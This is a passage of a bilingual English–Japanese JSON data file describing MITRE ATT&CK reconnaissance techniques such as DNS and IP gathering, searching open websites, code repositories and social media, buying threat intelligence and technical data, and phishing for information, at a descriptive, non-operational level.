                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のネットワークドメインに関する情報を収集する可能性があります。ドメインとそのプロパティに関する情報には、被害者が所有するドメインや管理データ（名前、レジストラなど）などのさまざまな詳細や、連絡先（メールアドレスや電話番号）、ビジネスアドレス、ネームサーバーなどのより直接的に実用的な情報が含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。被害者のドメインとそのプロパティに関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[WHOIS](https://attack.mitre.org/techniques/T1596/002)など）を介して攻撃者に公開される場合もあります。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS) サードパーティのクラウドプロバイダーが使用されている場合、この情報はまた、GetUserRealmやOffice 365環境のautodiscoverなど、一般に公開されているAPIエンドポイントを介して公開される場合があります。(引用: Azure Active Directory Reconnaisance)(引用: Office 265 Azure Domain Availability) この情報を収集すると、他の形式の偵察（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)、[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)、または[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)など）、運用リソースの確立（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1590.002",
                        "name_eng": "DNS",
                        "name_jp": "DNS",
                        "description_eng": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation: DNS-CISA)(Citation: Alexa-dns)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のDNSに関する情報を収集する可能性があります。DNS情報には、登録済みネームサーバーや、ターゲットのサブドメイン、メールサーバー、その他のホストのアドレス指定を概説するレコードなど、さまざまな詳細が含まれる場合があります。DNS MX、TXT、およびSPFレコードはまた、Office 365、G Suite、Salesforce、ZendeskなどのサードパーティクラウドおよびSaaSプロバイダーの使用を明らかにする可能性があります。(引用: Sean Metcalf Twitter DNS Records)\n\n攻撃者は、[DNS/パッシブDNS](https://attack.mitre.org/techniques/T1596/001)を介して詳細を照会または収集するなど、さまざまな方法でこの情報を収集する可能性があります。DNS情報はまた、オンラインまたはその他のアクセス可能なデータセット（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）を介して攻撃者に公開される場合もあります。(引用: DNS Dumpster)(引用: Circl Passive DNS) この情報を収集すると、他の形式の偵察（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)、[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)、または[アクティブスキャン](https://attack.mitre.org/techniques/T1595)など）、運用リソースの確立（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。\n\n攻撃者はまた、DNSゾーン転送（DNSクエリタイプAXFR）を使用して、誤って構成されたDNSサーバーからすべてのレコードを収集する可能性があります。(引用: Trails-DNS)(引用: DNS-CISA)(引用: Alexa-dns)"
                    },
                    {
                        "id": "T1590.005",
                        "name_eng": "IP Addresses",
                        "name_jp": "IPアドレス",
                        "description_eng": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のIPアドレスを収集する可能性があります。パブリックIPアドレスは、ブロック単位、つまり連続したアドレスの範囲で組織に割り当てられる場合があります。割り当てられたIPアドレスに関する情報には、使用中のIPアドレスなどのさまざまな詳細が含まれる場合があります。IPアドレスはまた、攻撃者が組織の規模、物理的な場所、インターネットサービスプロバイダー、または公開されているインフラストラクチャがどこで/どのようにホストされているかなど、被害者に関する他の詳細を導き出すことを可能にする場合もあります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。割り当てられたIPアドレスに関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）を介して攻撃者に公開される場合もあります。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS) この情報を収集すると、他の形式の偵察（[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)や[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1590.003",
                        "name_eng": "Network Trust Dependencies",
                        "name_jp": "ネットワーク信頼依存関係",
                        "description_eng": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のネットワーク信頼依存関係に関する情報を収集する可能性があります。ネットワーク信頼に関する情報には、接続された（そして潜在的に昇格された）ネットワークアクセスを持つセカンドパーティまたはサードパーティの組織/ドメイン（マネージドサービスプロバイダー、請負業者など）を含むさまざまな詳細が含まれる場合があります。\n\n敵対者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ネットワークの信頼関係に関する情報は、オンラインまたはその他のアクセス可能なデータセット（例：[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)）を介して敵対者に公開されることもあります。(引用：Pentesting AD Forests) この情報を収集することで、他の形態の偵察（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)または[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）、および/または初期アクセス（例：[信頼できる関係](https://attack.mitre.org/techniques/T1199)）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1590.004",
                        "name_eng": "Network Topology",
                        "name_jp": "ネットワークトポロジ",
                        "description_eng": "Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のネットワークトポロジに関する情報を収集する可能性があります。ネットワークトポロジに関する情報には、外部向けおよび内部ネットワーク環境の両方の物理的および/または論理的な配置を含むさまざまな詳細が含まれる場合があります。この情報にはまた、ネットワークデバイス（ゲートウェイ、ルーターなど）やその他のインフラストラクチャに関する詳細も含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。ネットワークトポロジに関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。(引用: DNS Dumpster) この情報を収集すると、他の形式の偵察（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)など）、運用リソースの確立（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)や[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1590.006",
                        "name_eng": "Network Security Appliances",
                        "name_jp": "ネットワークセキュリティアプライアンス",
                        "description_eng": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のネットワークセキュリティアプライアンスに関する情報を収集する可能性があります。ネットワークセキュリティアプライアンスに関する情報には、展開済みのファイアウォール、コンテンツフィルター、プロキシ/踏み台ホストの存在と詳細など、さまざまな詳細が含まれる場合があります。攻撃者はまた、ネットワークベースの侵入検知システム（NIDS）や防御的なサイバーセキュリティ運用に関連するその他のアプライアンスに関する情報を標的にする可能性もあります。\n\n敵対者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報収集のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接的な収集活動を通じて、様々な方法でこの情報を収集するかもしれない。(引用：Nmap Firewalls NIDS) ネットワークセキュリティアプライアンスに関する情報は、オンラインやその他のアクセス可能なデータセット（例：[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)）を通じて敵対者に公開されることもある。この情報を収集することで、他の形態の偵察（例：[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)や[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の機会が明らかになる可能性がある。"
                    }
                ]
            },
            {
                "id": "T1593",
                "name_eng": "Search Open Websites/Domains",
                "name_jp": "オープンなウェブサイト/ドメインの検索",
                "description_eng": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、自由に利用可能なウェブサイトやドメインを検索する可能性があります。被害者に関する情報は、ソーシャルメディア、ニュースサイト、または採用や契約の依頼/受注など事業運営に関する情報をホストするサイトなど、さまざまなオンラインサイトで利用できる場合があります。(引用: Cyware Social Media)(引用: SecurityTrails Google Hacking)(引用: ExploitDB GoogleHacking)\n\n敵対者は、収集しようとする情報に応じて、さまざまなオンラインサイトを検索するかもしれません。これらの情報源からの情報は、他の形態の偵察（例：[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)または[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)）、運用リソースの確立（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)または[フィッシング](https://attack.mitre.org/techniques/T1566)）の機会を明らかにする可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1593.002",
                        "name_eng": "Search Engines",
                        "name_jp": "検索エンジン",
                        "description_eng": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報を収集するために検索エンジンを使用する可能性があります。検索エンジンサービスは通常、オンラインサイトをクロールしてコンテキストをインデックス付けし、特定のキーワードや特定の種類のコンテンツ（ファイルタイプなど）を検索するための特殊な構文をユーザーに提供する場合があります。(引用: SecurityTrails Google Hacking)(引用: ExploitDB GoogleHacking)\n\n敵対者は、収集しようとする情報に応じて、さまざまな検索エンジンクエリを作成するかもしれません。脅威アクターは、検索エンジンを使用して被害者に関する一般的な情報を収集したり、ネットワークの詳細や資格情報などの機密情報の流出/漏洩を探すために特殊なクエリを使用したりするかもしれません。これらの情報源からの情報は、他の形態の偵察（例：[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)または[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)）、運用リソースの確立（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および/または初期アクセス（例：[有効なアカウント](https://attack.mitre.org/techniques/T1078)または[フィッシング](https://attack.mitre.org/techniques/T1566)）の機会を明らかにする可能性があります。"
                    },
                    {
                        "id": "T1593.003",
                        "name_eng": "Code Repositories",
                        "name_jp": "コードリポジトリ",
                        "description_eng": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  \n\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). \n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、公開コードリポジトリを検索する可能性があります。被害者は、GitHub、GitLab、SourceForge、BitBucketなどのさまざまなサードパーティWebサイト上のリポジトリにコードを保存している場合があります。ユーザーは通常、Webアプリケーションまたはgitなどのコマンドラインユーティリティを介してコードリポジトリと対話します。\n\n敵対者は、被害者に関するさまざまな情報について、さまざまな公開コードリポジトリを検索する可能性があります。公開コードリポジトリは、一般的に使用されるプログラミング言語やライブラリ、従業員の名前など、被害者に関するさまざまな一般情報のソースとなることがよくあります。攻撃者はまた、誤って漏洩した資格情報やAPIキーなど、より機密性の高いデータを特定する可能性もあります。(引用: GitHub Cloud Service Credentials) これらの情報源からの情報は、他の形式の偵察（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)など）、運用リソースの確立（[アカウントの侵害](https://attack.mitre.org/techniques/T1586)や[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[有効なアカウント](https://attack.mitre.org/techniques/T1078)や[フィッシング](https://attack.mitre.org/techniques/T1566)など）の機会を明らかにする可能性があります。\n\n**注:** これは、プライベートおよび内部でホストされているコードリポジトリからの[収集](https://attack.mitre.org/tactics/TA0009)に焦点を当てた[コードリポジトリ](https://attack.mitre.org/techniques/T1213/003)とは異なります。"
                    },
                    {
                        "id": "T1593.001",
                        "name_eng": "Social Media",
                        "name_jp": "ソーシャルメディア",
                        "description_eng": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報についてソーシャルメディアを検索する可能性があります。ソーシャルメディアサイトには、ビジネスの発表や、スタッフの役割、場所、興味に関する情報など、被害組織に関するさまざまな情報が含まれている場合があります。\n\n敵対者は、収集しようとする情報に応じて、さまざまなソーシャルメディアサイトを検索するかもしれません。脅威アクターは、これらのサイトから受動的にデータを収集したり、収集した情報を使用して偽のプロファイル/グループを作成し、特定の情報を明らかにするよう被害者を誘導したりするかもしれません（すなわち、[サービスを介したスピアフィッシング](https://attack.mitre.org/techniques/T1598/001)）。(引用: Cyware Social Media) これらの情報源からの情報は、他の形態の偵察（例：[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)または[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)）、運用リソースの確立（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および/または初期アクセス（例：[サービスを介したスピアフィッシング](https://attack.mitre.org/techniques/T1566/003)）の機会を明らかにする可能性があります。"
                    }
                ]
            },
            {
                "id": "T1597",
                "name_eng": "Search Closed Sources",
                "name_jp": "クローズドソースの検索",
                "description_eng": "Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、クローズド（有料、プライベート、またはその他の方法で自由に入手できない）ソースを検索および収集する可能性があります。被害者に関する情報は、技術/脅威インテリジェンスデータのフィードへの有料サブスクリプションなど、評判の良いプライベートソースおよびデータベースから購入できる場合があります。攻撃者はまた、ダークウェブやサイバー犯罪ブラックマーケットなどの評判の低いソースから情報を購入する可能性もあります。(引用: ZDNET Selling Data)\n\n敵対者は、収集しようとする情報に応じて、さまざまなクローズドデータベースを検索するかもしれません。これらの情報源からの情報は、他の形態の偵察（例：[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)または[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[能力の開発](https://attack.mitre.org/techniques/T1587)または[能力の取得](https://attack.mitre.org/techniques/T1588)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)または[有効なアカウント](https://attack.mitre.org/techniques/T1078)）の機会を明らかにする可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1597.001",
                        "name_eng": "Threat Intel Vendors",
                        "name_jp": "脅威インテリジェンスベンダー",
                        "description_eng": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる情報について、脅威インテリジェンスベンダーからの個人データを検索する可能性があります。脅威インテリジェンスベンダーは、公に報告されている以上のデータを提供する有料フィードまたはポータルを提供する場合があります。機密情報（顧客名やその他の識別子など）は編集されている可能性がありますが、この情報には、ターゲット業界、帰属の主張、成功したTTP/対策などの侵害に関する傾向が含まれている場合があります。(引用: D3Secutrity CTI Feeds)\n\n敵対者は、実用的な情報を収集するために、民間の脅威インテリジェンスベンダーのデータを検索するかもしれない。脅威アクターは、自身のキャンペーンに関する情報/指標や、標的とする業界、能力/目的、その他の運用上の懸念事項と一致する可能性のある他の敵対者によって実施されたキャンペーンに関する情報を求めるかもしれない。ベンダーによって報告された情報はまた、他の形態の偵察（例：[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[能力の開発](https://attack.mitre.org/techniques/T1587)または[能力の取得](https://attack.mitre.org/techniques/T1588)）、および/または初期アクセス（例：[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)または[外部リモートサービス](https://attack.mitre.org/techniques/T1133)）の機会を明らかにする可能性がある。"
                    },
                    {
                        "id": "T1597.002",
                        "name_eng": "Purchase Technical Data",
                        "name_jp": "技術データの購入",
                        "description_eng": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する技術情報を購入する可能性があります。被害者に関する情報は、スキャンデータベースのフィードへの有料サブスクリプションやその他のデータ集約サービスなど、評判の良い民間ソースやデータベース内で購入できる場合があります。攻撃者はまた、ダークウェブやサイバー犯罪ブラックマーケットなどの評判の低いソースから情報を購入する可能性もあります。\n\n敵対者は、既に特定したターゲットに関する情報を購入したり、購入したデータを使用して侵害の成功機会を発見したりするかもしれない。脅威アクターは、従業員の連絡先情報、認証情報、あるいは被害者のインフラに関する詳細など、購入したデータから様々な技術的詳細を収集するかもしれない。(引用：ZDNET Selling Data) これらの情報源からの情報は、他の形態の偵察（例：[情報収集のためのフィッシング](https://attack.mitre.org/techniques/T1598)あるいは[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[能力の開発](https://attack.mitre.org/techniques/T1587)あるいは[能力の取得](https://attack.mitre.org/techniques/T1588)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)あるいは[有効なアカウント](https://attack.mitre.org/techniques/T1078)）の機会を明らかにするかもしれない。"
                    }
                ]
            },
            {
                "id": "T1598",
                "name_eng": "Phishing for Information",
                "name_jp": "情報のためのフィッシング",
                "description_eng": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag 